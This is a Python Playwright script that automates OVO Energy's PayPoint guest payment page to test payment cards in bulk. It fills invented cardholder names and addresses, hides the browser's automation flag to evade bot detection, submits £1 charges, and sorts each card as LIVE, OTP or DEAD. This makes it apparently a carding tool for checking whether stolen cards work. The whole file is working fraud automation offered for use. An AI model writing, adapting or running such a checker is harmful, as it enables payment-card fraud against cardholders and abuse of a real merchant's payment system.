from playwright.async_api import async_playwright
import asyncio
import faker as faker_module
import uuid
import os

faker = faker_module.Faker("en_GB")

async def run_ovocharger(card_details: str, user_id: str):
    screenshot_path = f"screenshots/{uuid.uuid4().hex}.png"
    os.makedirs("screenshots", exist_ok=True)

    card_parts = card_details.strip().split('|')
    if len(card_parts) != 4:
        return None, "INVALID_FORMAT"
    
    cardnumber, expirymonth, expiryyear, cvv = card_parts
    if len(expiryyear) == 2:
        expiryyear = "20" + expiryyear

    async with async_playwright() as p:
        browser = await p.chromium.launch_persistent_context(
            user_data_dir=f"/tmp/playwright-profile-{uuid.uuid4().hex}",
            headless=True,
            args=["--no-sandbox"]
        )
        page = await browser.new_page()
        await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
        status = "UNKNOWN"
        try:
            await page.goto("https://ovoenergypayments.paypoint.com/GuestPayment", timeout=60000)

            # Fill fake data
            await page.fill('#customerid', str(user_id))
            await page.fill('#amount', '1')
            await page.fill('#cardholdername', faker.name())
            await page.fill('#postcode', faker.postcode())
            await page.fill('#address1', faker.street_address())
            await page.fill('#city', faker.city())
            await page.fill('#emailForConfirmation', 'maxxxier@yahoo.com')
            await page.fill('#mobileNumberForSmsConfirmation', '07454805800')
            await page.check('input[name="AcceptedTermsAndConditions"]')

            # Fill card inside iframe
            frame_element = await page.wait_for_selector('iframe[src*="hostedfields.paypoint.services"]', timeout=10000)
            frame = await frame_element.content_frame()
            await frame.fill('input[name="card_number"]', cardnumber)
            await frame.select_option('select[name="PaymentCard.ExpiryMonth"]', expirymonth)
            await frame.select_option('select[name="PaymentCard.ExpiryYear"]', expiryyear)
            await frame.fill('input[name="PaymentCard.CVV"]', cvv)

            # Click payment
            button_locator = page.locator('input#makePayment')
            await button_locator.click(force=True)
            await page.wait_for_timeout(5000)

            # Check page/iframe content
            for f in page.frames:
                content = await f.content()
                text = content.lower()
                if "payment authorised" in text:
                    status = "LIVE"
                    break
                elif any(w in text for w in ["verify", "otp", "authorise", "mobile app"]):
                    status = "OTP"
                    break
                elif "declined" in text:
                    status = "DEAD"
                    break

            await page.screenshot(path=screenshot_path, full_page=True)

        except Exception as e:
            print(f"[Error] Card {cardnumber}: {e}")
            status = "ERROR"
        finally:
            await browser.close()

    return screenshot_path, status


async def process_multiple_cards(cards: list[str], user_id: str):
    tasks = [run_ovocharger(card, user_id) for card in cards]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return results


# Example usage
if __name__ == "__main__":
    test_cards = [
        "1234567812345678|12|25|123",
        "8765432187654321|01|24|321",
    ]
    user_id = "42"

    results = asyncio.run(process_multiple_cards(test_cards, user_id))
    for idx, result in enumerate(results):
        screenshot, status = result
        print(f"Card {idx+1}: Status={status}, Screenshot={screenshot}")
